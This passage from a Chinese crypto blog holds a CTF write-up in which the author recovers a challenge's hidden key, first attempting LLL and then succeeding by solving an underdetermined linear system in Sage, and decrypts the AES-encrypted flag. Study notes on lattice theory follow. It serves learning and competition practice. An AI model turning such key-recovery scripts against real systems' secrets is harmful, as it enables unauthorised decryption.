class="built_in">int</span>(input())</span><br><span class="line">    <span class="keyword">if</span> response != sum(x*y%p <span class="keyword">for</span> x, y in zip(challenge, <span class="built_in">key</span>)):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;ACCESS DENIED&#x27;</span>)</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;ACCESS GRANTED&#x27;</span>)</span><br><span class="line">    cipher = AES.<span class="keyword">new</span>(</span><br><span class="line">            sha256(<span class="string">&#x27; &#x27;</span>.<span class="built_in">join</span>(<span class="built_in">map</span>(<span class="built_in">str</span>, <span class="built_in">key</span>)).encode(<span class="string">&#x27;utf-8&#x27;</span>)).digest(),</span><br><span class="line">            AES.MODE_CFB,</span><br><span class="line">            b<span class="string">&#x27;\0&#x27;</span>*<span class="number">16</span>)</span><br><span class="line">    <span class="built_in">print</span>(binascii.hexlify(cipher.encrypt(flag)).decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure><h3 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h3><blockquote><p> 就着上一题中<strong>更多</strong>里<strong>调整</strong>所指向的文章，按照跟着把题都走一遍的思路，笔者跟着参考[1]、[2]进行了复现</p></blockquote><p>读题可知，题目分别生成了有N个数据的key、challenge，并给出了challenge.</p><p>然后计算<br>$$<br>response =\sum\limits^{n}_{i=1} (key_i•challenge_i\mod p)<br>$$<br>其后，要求输入response，如果满足如上关系，则输出<code>ACCESS GRANTED</code>,进行AES加密并给出密文；反之，输出<code>ACCESS DENIED</code>，程序终止.</p><p>事实上，<strong>原题中还有后缀为<code>pcap</code>的流量文件</strong>，经过一番操作，能在其中找到39组<code>ACCESS GRANTED</code>， 1组<code>ACCESS DENIED</code>的数据，而这些数据的key都是相同的，challenge不同.</p><p>但最初，笔者由于没看完整，以为题目只有一组数据，便进行了如下格相关的尝试，也一并记录.</p><h4 id="格的尝试"><a href="#格的尝试" class="headerlink" title="格的尝试"></a>格的尝试</h4><p>对于题目关系式，有:<br>$$<br>\begin{aligned} response &amp;= \sum\limits^{n}_{i=1} (key_i•challenge_i\mod p) \\&amp;= (key_1•challenge_1\mod p)+\cdots+(key_n•challenge_n\mod p) \\&amp;= (key_1•challenge_1-k_1p)+\cdots+(key_n•challenge_n-k_np)\\&amp;=key_1•challenge_1+key_2•challenge_2+\cdots+key_n•challenge_n-Kp\end{aligned}<br>$$<br>于是，尝试构造出了如下$\vec v•M=\vec w$:<br>$$<br>\left(\begin {array}{c} key_1&amp; key_2 &amp; \cdots &amp; key_n &amp; -K &amp;-1 \end{array}\right)<br>\left(\begin {array}{c} 1 &amp;&amp;&amp;&amp;challenge_1 \newline &amp;1&amp;&amp;&amp;challenge_2 \newline &amp;&amp;\ddots&amp;&amp;\vdots \newline &amp;&amp;&amp;1&amp;challenge_n \newline &amp;&amp;&amp;&amp;p \newline &amp;&amp;&amp;&amp;response \end{array} \right)<br>=\left(\begin {array}{c} key_1&amp; key_2 &amp; \cdots &amp; key_n &amp; 0 \end{array} \right)<br>$$<br>代码如下:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">p</span> = <span class="number">21652247421304131782679331804390761485569</span></span><br><span class="line"><span class="attribute">keys</span> =<span class="meta"> [298539175337331255822704105154795432720, 87140312711560535519086100550511205417, 184565474844349422800783273599048425518, 322281095696764831303430402664544221782, 10400176126102731014865154526193609901, 311465050308096828975786552590023761047, 255543084918661041085926125287141045637, 79506218523423179907548173152929818342, 45127622693714341638449515791872751108, 189819995420542088052860112540829995739, 251374742294581828998093738126822163367, 203832280452324126328620582890495674996, 276981611438190156791305837293732442983, 288713927320477818592627903418003091123, 232311167516524001929598819486418980667, 157175040606779034199182197251072938366, 253212855985810816107007930574788462463, 335737146313567537712317087100578791078, 224883045916887966304785559524859262485, 297772449149619863804975952098453046285, 182833023906487083779397773842271383684, 86424278793790309842042746782700597387, 48331648015807044859719644455528004502, 84675795786570086326159698012985374357, 29110538972227458052024422940866622686, 253099757893796574225592257618792382437, 130537441163239093124605207456906834947, 322155896745895123492974744840882728867, 143101606987208560544898347284570832542, 80450319795726972707024923435125439685, 184065293786381762488571639852159810873, 205044465185924930804255180092585954074, 173665803192211371735475948882255227793, 123099426723362751771022368568165468623, 98466978851123638099977546944074974441, 31051100745015300309538145741109661945, 15910164152988070825459049904390353845, 252133565197849684576683589325162079216, 221213935179163593563144900557245217124, 91600573494280665083155798786110626030]</span></span><br><span class="line"><span class="attribute">response</span> = <span class="number">447921450281780579254201675117968298414027</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">M</span> = Matrix(len(keys)+<span class="number">2</span>, len(keys)+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="attribute">for</span> i in range(len(keys)):</span><br><span class="line">    <span class="attribute">M</span>[i,i]=<span class="number">1</span></span><br><span class="line">    <span class="attribute">M</span>[i, -<span class="number">1</span>]=keys[i]</span><br><span class="line"><span class="attribute">M</span>[-<span class="number">2</span>, -<span class="number">1</span>]=p</span><br><span class="line"><span class="attribute">M</span>[-<span class="number">1</span>, -<span class="number">1</span>]=response</span><br><span class="line">    </span><br><span class="line"><span class="attribute">for</span> i in M.LLL():</span><br><span class="line">    <span class="attribute">print</span>(i)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20221230182818252.png" alt="fail"></p><p>肉眼可见，规约并不理想.</p><p>但也不是坏事，对格构造更熟练的同时，也知悉了些“常识”.</p><p>比如<strong>建立了直觉</strong>. 形如如下的格经过LLL后，会得到<strong>分量极小</strong>的结果（当然可以用Minkowski’s theorem证实）<br>$$<br>\left(\begin {array}{c} 1 &amp;&amp;&amp;&amp;challenge_1 \newline &amp;1&amp;&amp;&amp;challenge_2 \newline &amp;&amp;\ddots&amp;&amp;\vdots \newline &amp;&amp;&amp;1&amp;challenge_n \newline &amp;&amp;&amp;&amp;p \newline &amp;&amp;&amp;&amp;response \end{array} \right)<br>$$<br>又说回来，这些分量极小的结果基本都是0与$\pm1$，巧妙的契合了背包问题.</p><p>所以，我们得到结论：<strong>背包类格子</strong>并不能得到大数.</p><hr><h4 id="正途"><a href="#正途" class="headerlink" title="正途"></a>正途</h4><p>仔细、完整读题后，为抓住重点、简化过程，对题目源码进行如下修改</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os, math, sys, binascii</span><br><span class="line">flag = <span class="string">b&#x27;flag&#123;2022-12-30-Harry0597&#125;&#x27;</span></span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">p = <span class="number">21652247421304131782679331804390761485569</span></span><br><span class="line">bits = <span class="number">128</span></span><br><span class="line">N = <span class="number">40</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rand</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>.from_bytes(os.urandom(bits // <span class="number">8</span>), <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">keygen</span>():</span></span><br><span class="line">    <span class="keyword">return</span> [rand() <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(N)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    key = keygen()</span><br><span class="line">    Cs = []</span><br><span class="line">    Rs = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N-<span class="number">1</span>):</span><br><span class="line">        challenge = keygen()</span><br><span class="line">        Cs.append(challenge)</span><br><span class="line"></span><br><span class="line">        response = <span class="built_in">sum</span>(x * y % p <span class="keyword">for</span> x, y <span class="keyword">in</span> <span class="built_in">zip</span>(challenge, key))</span><br><span class="line">        Rs.append(response)</span><br><span class="line">    cipher = AES.new(</span><br><span class="line">        sha256(<span class="string">&#x27; &#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, key)).encode(<span class="string">&#x27;utf-8&#x27;</span>)).digest(),</span><br><span class="line">        AES.MODE_CFB,</span><br><span class="line">        <span class="string">b&#x27;\0&#x27;</span> * <span class="number">16</span>)</span><br><span class="line">    <span class="built_in">print</span>(key)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Cs =&quot;</span>, Cs)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Rs =&quot;</span>, Rs)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ct =&quot;</span>, <span class="string">&quot;&#x27;&quot;</span>+binascii.hexlify(cipher.encrypt(flag)).decode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">&quot;&#x27;&quot;</span>)</span><br></pre></td></tr></table></figure><p>问题也就演变成了：对于<strong>40个未知数</strong>，我们只有<strong>39个方程</strong>，求解这40个未知数.</p><p>通过学习参考[2]，笔者了解到：</p><ol><li>非齐次线性方程组的解的情况和矩阵<code>Challenge</code>的秩有关</li><li>欠定方程要么无解，要么便有无数个解</li><li>可利用<strong>Sagemath</strong>对非齐次线性欠定方程组求<strong>特解</strong></li></ol><p>故此，有如下矩阵运算:<br>$$<br>challenge_{39\times 40} \times key_{40\times 1} = response_{39\times 1}<br>$$<br>而原题中，利用Sage求出的特解恰好就是key,可用来求解密文.</p><p>Sage求解代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"></span><br><span class="line">p = <span class="number">21652247421304131782679331804390761485569</span></span><br><span class="line">I = Integers(p)</span><br><span class="line"></span><br><span class="line">Cs = []</span><br><span class="line">Rs = []</span><br><span class="line">ct = <span class="string">&#x27;&#x27;</span></span><br><span class="line">ct=<span class="string">b&#x27;&#x27;</span>.fromhex(ct)</span><br><span class="line"></span><br><span class="line">C = Matrix(I,Cs)</span><br><span class="line">R = vector(I,Rs)</span><br><span class="line">key = C.solve_right(R)  <span class="comment"># 输出特解</span></span><br><span class="line">key=<span class="built_in">list</span>(key)</span><br><span class="line"><span class="built_in">print</span>(key)</span><br><span class="line"></span><br><span class="line">cipher = AES.new(sha256(<span class="string">&#x27; &#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, key)).encode(<span class="string">&#x27;utf-8&#x27;</span>)).digest(),AES.MODE_CFB,<span class="string">b&#x27;\0&#x27;</span>*<span class="number">16</span>)</span><br><span class="line">flag = cipher.decrypt(ct)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p><strong>更多</strong></p><p>就出题而言，为了达到<strong>利用Sage求出的特解恰好就是key</strong>效果，出题人当是在利用sage等工具求得特解后，反代入题目源码中，生成密文.</p><p><strong>TL;DR</strong></p><ul><li>建立用矩阵运算表达方程的思维</li><li>知悉Sage可以求解非齐次线性欠定方程组<strong>特解</strong></li></ul><h3 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h3><p>[1] <a href="https://holocircuit.github.io/2019/01/08/unofficial.html">https://holocircuit.github.io/2019/01/08/unofficial.html</a></p><p>[2] <a href="https://xz.aliyun.com/t/3776">https://xz.aliyun.com/t/3776</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>格密码学习</title>
      <link href="/2022/12/30/%E6%A0%BC%E5%AF%86%E7%A0%81%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/12/30/%E6%A0%BC%E5%AF%86%E7%A0%81%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="格｜Lattice"><a href="#格｜Lattice" class="headerlink" title="格｜Lattice"></a>格｜Lattice</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><blockquote><p>线性无关基向量$v_1, v_2, v_3, .. ., v_n$的所有整系数线性组合所形成的$n$维离散空间。</p></blockquote><p>给定n维空间中一组<strong>线性无关</strong>向量，其<strong>整系数</strong>组合构成的集合称为格。</p><p>格上的点排布呈周期性规律。</p><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20221115221257017.png" alt="2-dimension Lattice"></p><p>这里需要明确，<strong>不同的格基可能表示的是同一个格</strong>, 如下:</p><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20221130231915760.png" alt="image-20221130231915760"></p><h2 id="为什么学格"><a href="#为什么学格" class="headerlink" title="为什么学格"></a>为什么学格</h2><p>为什么要学习，乃至于到致力于研究格的地步呢？</p><p>答案显而易见，因为格是困难的，好用的。</p><h3 id="困难"><a href="#困难" class="headerlink" title="困难"></a>困难</h3><p>先说困难性，准确说，应该是<strong>基于格基的数学问题是困难的</strong>，以至于可利用之构造抵抗量子计算机攻击的密码体系。</p><p>最直观的体会其困难性，有如下例子：</p><blockquote><p>在二维格中找到格上一点，稍作移动使其离开格，给出这个不在格上的点，问原来的点位置几何？</p></blockquote><p>这是好想象、也容易解决的问题，并不困难。</p><p>但实际上，当维度变到两三百的时候，就无法想象更难解决了。</p><h3 id="好用"><a href="#好用" class="headerlink" title="好用"></a>好用</h3><p>首先，得明确：在一定程度上，我们利用成熟的算法，能解决一些格难题。</p><p>那么，若我们能把其他难题<strong>规约</strong>到格难题上，再解决这个难题，就能破解原难题。</p><p>其次，还可以利用格来进行<a href="https://zhuanlan.zhihu.com/p/100312449">安全性证明</a>。</p><h2 id="格基等价变换"><a href="#格基等价变换" class="headerlink" title="格基等价变换"></a>格基等价变换</h2><p>这里，若有线性代数的基础，想必是好理解的，<a href="https://www.youtube.com/playlist?list=PLZHQObOWTQDPD3MizzM2xVFitgF8hE_ab">若无则需来学学</a>。</p><p>现，设我们有格基$v_1, v_2, v_3, .. ., v_n$，若进行如下<strong>初等变化</strong>(不改变行列式的值)，则新格基所生格与原来一样。</p><ol><li><p>列向量交换：$v_i &lt;——&gt; v_j$</p></li><li><p>向量取反：$v_i &lt;—— -v_i$</p></li><li><p>整系数线性组合：$v_i &lt;—— v_i + k·v_j$</p></li></ol><p>而以上操作，总能被简洁的总结为：<strong>格基矩阵右乘一个幺模矩阵</strong>（一种整数矩阵，其行列式的值为+1或-1，且幺模矩阵的逆还是幺模矩阵）</p><p>这有什么用呢？不妨考虑如下问题</p><blockquote><p>任给两组格基，问它们所生成的格是否一致？</p></blockquote><p>不难想到，有如下定理：</p><p><strong>当且仅当两组格基满足$B_2=B_1U$（U为幺模矩阵）时，两组格基等价</strong></p><p>于是，我们原问题等价于：$B_1^{-1}B_2$是否为幺模矩阵。得解。</p><h2 id="格基本区域"><a href="#格基本区域" class="headerlink" title="格基本区域"></a>格基本区域</h2><p>格的基本区域可用基础平行多面体表示。</p><h3 id="基础平行多面体-｜-FUNDAMENTAL-PARALLELEPIPED"><a href="#基础平行多面体-｜-FUNDAMENTAL-PARALLELEPIPED" class="headerlink" title="基础平行多面体 ｜ FUNDAMENTAL PARALLELEPIPED"></a>基础平行多面体 ｜ FUNDAMENTAL PARALLELEPIPED</h3><p>给定格基，基础平行多面体$P(B) = \{a_1v_1,a_2v_2,\dots, a_nv_n | a_i\in[0,1) \}$    （注意：<strong>左闭右开</strong>）</p><p>可理解为<strong>格中最小重复单元</strong>。</p><p>从二维格上理解，就是如下红色区域：</p><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20221130234835554.png" alt="fundamental parallelepiped"></p><p>显而易见，重复堆叠如上基础平行多面体，我们能找到所有的格点。</p><p>不仅如此，若我们在空间中任取一点k，我们都能将它映射到基础平行多面体中一个点上。</p><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20221130235421587.png" alt="点k"></p><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20221130235555130.png" alt="映射"></p><p>如上操作可归纳为：</p><p>$k=a_{1}v_{1}+…+a_{n}v_{n}$</p><p>映射：$k \mod P(B)=(a_1 \mod1)v_{1}+…+(a_{n} \mod 1)v_{n}$</p><p>那么，现在不妨考虑如下问题</p><blockquote><p>任意给定 空间中一点k 与 格的基础平行多面体P(B)，问点k是否在格上？</p></blockquote><p>有如上铺垫，不难想到，当$k \mod P(B)=(a_1 \mod1)v_{1}+…+(a_{n} \mod 1)v_{n}=0$，也即k映射到原点时，点k才在格上。</p><p>格的基本区域可用基础平行多面体表示。显然，格的基本区域并不唯一，以二维格为例，形状可以千奇百怪，但基础平行多面体的面积（更高维度则是体积）需一致。</p><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20221201002510635.png" alt="基本区域不唯一"></p><h3 id="行列式"><a href="#行列式" class="headerlink" title="行列式"></a>行列式</h3><p>需要知道，行列式本质是数（标量），一种经过运算后所得到的数。</p><p>而这种运算的实际意义是：<strong>基向量构成的多面体的体积，也即基本区域的体积。</strong></p><p>于是，便自然有了些推论：</p><ul><li><p>若多组格基生成的格都一致，那么这些格基所构成的行列式值都相等</p><p>$$|det（BU)| = |det(B)det(U)|=|det(B)|$$</p></li><li><p>考虑格的密度问题，当格基行列式值越小，则格点比较密集，密度较大</p><p>也即：<strong>可用格基行列式值衡量格点密度（反相关）</strong></p></li></ul><h2 id="延展空间｜span"><a href="#延展空间｜span" class="headerlink" title="延展空间｜span"></a>延展空间｜span</h2><p>我们称格 $L(B)$ 中基向量的所有线性组合所形成的集合为这组基向量所张成的延展空间(span)<br>$$<br>\mathop{span}(L(B)) = \mathop{span}(B)= \{a_1v_1,a_2v_2,\dots, a_nv_n | a_i\in R \}<br>$$<br>不妨思考如下问题</p><blockquote><p>所有格的延展空间都是整个n维空间吗？</p></blockquote><p>答案是显然的，<strong>不</strong>。</p><p>只有满秩格（秩的概念详见线性代数，这里满秩可简单理解为格基行列式的行数等于列数）的延展空间是整个n维空间。</p><p>此外，需注意辨析延展空间(SPAN)与基本区域(FUNDAMENTAL PARALLELEPIPED)的差异。</p><h2 id="连续极小-successive-minima"><a href="#连续极小-successive-minima" class="headerlink" title="连续极小|successive minima"></a><strong>连续极小</strong>|successive minima</h2><p><strong>Successive minima</strong>，<strong>逐次最小长度</strong>，也可以叫为<strong>连续极小</strong>。</p><p>在学习这个概念之前，不妨先尝试回答如下问题</p><blockquote><p>给定一个格，问其中最短向量的长度为？</p></blockquote><p>或许一想到高维度的格，你就会觉得这个问题是难求解的。</p><p>但事实上，咬文嚼字后，其实你可以回答<strong>0</strong>，因为原点本身一定是格点，而最短向量长度则一定是0了。</p><p>但显然，这个命题除了提醒你该仔细起来外，没什么意义。</p><p>因此，在讨论最短向量时，我们一般找的是<strong>最短非零向量</strong>，而其长度一般用欧几里得范数表示。</p><h3 id="定义-1"><a href="#定义-1" class="headerlink" title="定义"></a>定义</h3><h4 id="lambda-i-L"><a href="#lambda-i-L" class="headerlink" title="$\lambda_i(L)$"></a>$\lambda_i(L)$</h4><p>假设存在最小值$r$，使得能在半径为$r$的球内找到$i$个格点，且它们的延展空间为整个$i$维空间，则称这个$r$为$\lambda_i(L)$.</p><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20221203083702386.png" alt="span"></p><p><strong>最重要的，得知道$\lambda_1(L)$指的是格L最短非零向量的长度。</strong></p><h2 id="施密特正交化｜Gram-Schmidt-Orthogonalization"><a href="#施密特正交化｜Gram-Schmidt-Orthogonalization" class="headerlink" title="施密特正交化｜Gram-Schmidt Orthogonalization"></a><a href="https://zh.wikipedia.org/wiki/格拉姆-施密特正交化">施密特正交化｜Gram-Schmidt Orthogonalization</a></h2><p>施密特正交化是线性代数中将一组基转化为正交基的运算过程.</p><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20221201015752015.png" alt="GSO"></p><p>具体如下：</p><ol><li><p>给定一组 n 个线性无关向量 $b_1,b_2,…,b_n$</p></li><li><p>计算，得到正交基$\widetilde{b_1},\widetilde{b_2},…,\widetilde{b_n}$</p></li></ol><p>$$<br>   \widetilde{b_1}=b_1\\ \widetilde{b_2}=b_2-\mu_{2,1}\widetilde{b_1},\mu_{2,1}={&lt;b_2,\widetilde{b_1}&gt;\over &lt;\widetilde{b_1},\widetilde{b_1}&gt;}\\ \vdots\\ \widetilde{b_i}=b_i-\sum^{i-1}\limits_{j=1}\mu_{i,j}\widetilde{b_j},\mu_{i,j}={&lt;b_i,\widetilde{b_j}&gt;\over &lt;\widetilde{b_j},\widetilde{b_j}&gt;}<br>$$</p><p>   注：</p><ul><li>$&lt;b_i, \widetilde{b_j}&gt;$表示$b_i$与$b_j$内积</li><li>$\mathop{pro}_{\widetilde{b_j}}{b_i}={&lt;b_i,\widetilde{b_j}&gt;\over &lt;\widetilde{b_j},\widetilde{b_j}&gt;}\widetilde{b_j}$, 表示$b_i$在$\widetilde{b_j}$上投影</li></ul><p>此外，还可以进一步求出标准正交基：$\widetilde{b_1}/||\widetilde{b_1}||,\widetilde{b_2}/||\widetilde{b_2}||,…,\widetilde{b_n}/||\widetilde{b_n}||$</p><p>值得一提，施密特正交化能将基正交化，但并不能直接应用于格基，因为正交化过程中系数并没限制为整数，也就是 格基 施密特正交化后的结果很可能不在格上</p><h3 id="QR分解｜QR-decomposition"><a href="#QR分解｜QR-decomposition" class="headerlink" title="QR分解｜QR decomposition"></a>QR分解｜QR decomposition</h3><p>QR分解是施密特正交化的应用</p><p>对于格而言，先对格基间接施密特正交化（涉及系数四舍五入取整）后，得到近似正交基$\widetilde{b_1},\widetilde{b_2},…,\widetilde{b_n}$，然后构造如下矩阵</p><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20221201021555854.png" alt="QR decomposition"></p><p>  本质上，QR分解形式的矩阵是格基的另一种矩阵表示法，上图中每个列向量都是格基</p><h4 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h4><ol><li><p>因为QR分解矩阵是上三角，所以格基为$b_1,b_2,…,b_n$的格基本区域（行列式）就等于$||\widetilde{b_1}||,||\widetilde{b_2}||,…,||\widetilde{b_n}||$的乘积。</p></li><li><p>$\lambda_1(L)&gt;=\mathop{min}(||\widetilde{b_i}||)$</p><p>$Proof：$</p><p>最短非零向量能由这n组向量线性组合表示，而当最右下角的$||\widetilde{b_n}||$不为零（格的基本区域不为0，保证了这一点）时，纵使其上所有数都消为0，仍有$(0,0,…,\widetilde{b_n})$,也即：组出来的向量欧几里得长度一定大于等于$||\widetilde{b_n}||$</p><p>所以最为理想的，当$||\widetilde{b_n}||=\mathop{min}(||\widetilde{b_i}||)$时，$\lambda_1(L)$最短可能是$\mathop{min}(||\widetilde{b_i})||$，其余情况一律大于之</p><p>（更严谨的证明如下）</p><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20221203081933090.png" alt="image-20221203081933090"></p><p><strong>总之，我们得到了$\lambda_1$下界</strong>。</p></li></ol><h2 id="闵可夫斯基定理｜Minkowski’s-theorem"><a href="#闵可夫斯基定理｜Minkowski’s-theorem" class="headerlink" title="闵可夫斯基定理｜Minkowski’s theorem"></a>闵可夫斯基定理｜Minkowski’s theorem</h2><p>正如前文所述，通过QR分解，我们求得了$\lambda_1$下界(也即一个格中最短非零向量的长度下限).</p><p>而接下来所介绍的闵可夫斯基定理，将揭示出<strong>$\lambda_1$上界</strong>.</p><p>在学习闵可夫斯基定理之前，让我们先来了解Blichfeld定理.</p><h3 id="Blichfeld定理-｜-Blichfeld’s-theorem"><a href="#Blichfeld定理-｜-Blichfeld’s-theorem" class="headerlink" title="Blichfeld定理 ｜ Blichfeld’s theorem"></a>Blichfeld定理 ｜ Blichfeld’s theorem</h3><p>对于任意格$L$和一个大于格$L$基本区域体积的集合$S$，一定存在$z_1,z_2 \in S$, 满足$z_1-z_2 \in L$</p><p>抽象的定理可以用直观图像来阐释，如下：</p><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20221227165711736.png" alt="Blichfeld1"></p><p>如上，讲座中选取了袋鼠🦘形状的集合S，因为单个S的面积大于基础区域，所以当S平铺在每个格点上时将会有重叠区域（袋鼠头尾相碰）.</p><p>显然，当两个格点相减所构成的向量（上图中红箭头）在格上。也易知，这个向量不会长于一个袋鼠最长的长度，也就是说：通过平移，我们总能在一个S的重叠区域中找到这个在格上的<strong>向量</strong>，如下图中蓝色箭头.</p><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20221227171054166.png" alt="Blichfeld2"></p><h3 id="MINKOWSKI凸体定理｜MINKOWSKI’S-CONVEX-BODY-THEOREM"><a href="#MINKOWSKI凸体定理｜MINKOWSKI’S-CONVEX-BODY-THEOREM" class="headerlink" title="MINKOWSKI凸体定理｜MINKOWSKI’S CONVEX BODY THEOREM"></a>MINKOWSKI凸体定理｜MINKOWSKI’S CONVEX BODY THEOREM</h3><p>设 Λ 为秩 n 的全秩格(满格)。对于任何<strong>中心对称凸集 S</strong> ，如果 $vol(S)&gt;2^ndet(Λ)$ 则 S 包含一个非零格点。</p><p>直白说来，就是在格上任取一个集合满足如下条件的S，则S必然包含一个<strong>非零格点</strong>。</p><p>1.S是一个凸集合（否则总能巧妙的避开些点）</p><p>2.S的空间关于原点对称</p><p>3.如果S体积足够大，不仅要大于行列式，还要大于2^n乘行列式</p><p><strong>Proof</strong></p><p>​    对于$\frac{S}{2}=\{x:2x\in S\}$，因为$vol(S)&gt;2^ndet(Λ)$，所以$vol(\frac{S}{2})=2^{-n}vol(S)&gt;det(Λ)$</p><p>​    由Blichfeld定理，得：$\exists z_1、z_2 \in \frac{S}2{}$, 满足$z_1-z_2 \in Λ$. </p><p>​    又因为$2z_1、2z_2、-2z_2(对称性) \in S$,  所以:$\frac{2z_1-2z_2}{2} = z_1-z_2 \in S$</p><p>​    也即：S上存在<strong>一点</strong>（$2z_1、-2z_2$的中点）在Λ上</p><p>（证明思路可以多过几遍，注意体会Blichfeld定理中<strong>有向量在格上</strong> 和 MINKOWSKI凸体定理中<strong>有非零格点在格上</strong>差异）</p><h3 id="MINKOWSKI第一定理｜MINKOWSKI’S-FIRST-THEOREM"><a href="#MINKOWSKI第一定理｜MINKOWSKI’S-FIRST-THEOREM" class="headerlink" title="MINKOWSKI第一定理｜MINKOWSKI’S FIRST THEOREM"></a>MINKOWSKI第一定理｜MINKOWSKI’S FIRST THEOREM</h3><p>$$<br>\lambda_1(Λ) \leq \sqrt{n} * \sqrt[n]{det(Λ)}<br>$$</p><p>挺重要的推论，这确定了格中最短非零向量的上界，这十分有助于我们寻找与验证最短非零向量。</p><h3 id="MINKOWSKI第二定理｜MINKOWSKI’S-SECOND-THEOREM"><a href="#MINKOWSKI第二定理｜MINKOWSKI’S-SECOND-THEOREM" class="headerlink" title="MINKOWSKI第二定理｜MINKOWSKI’S SECOND THEOREM"></a>MINKOWSKI第二定理｜MINKOWSKI’S SECOND THEOREM</h3><p>$$<br>(\prod_{i=1}^{n} \lambda_i(Λ))^{\frac{1}{n}} \le \sqrt{n} * \sqrt[n]{det(Λ)}<br>$$</p><p>只做了解，不做介绍。</p><h2 id="困难问题"><a href="#困难问题" class="headerlink" title="困难问题"></a>困难问题</h2><p>区分、了解、学习格中困难问题很有必要。</p><p>首先，得会区分。</p><p>通过前文的讲述，我们能归纳出格中<strong>容易问题</strong>如下：</p><p>1.已知基和一个向量v，验证v是否在格L中</p><p>2.给定两组格基，判断两者生成的格是否等价</p><p>区分出容易问题后，我们接着来认识以下困难问题。</p><h3 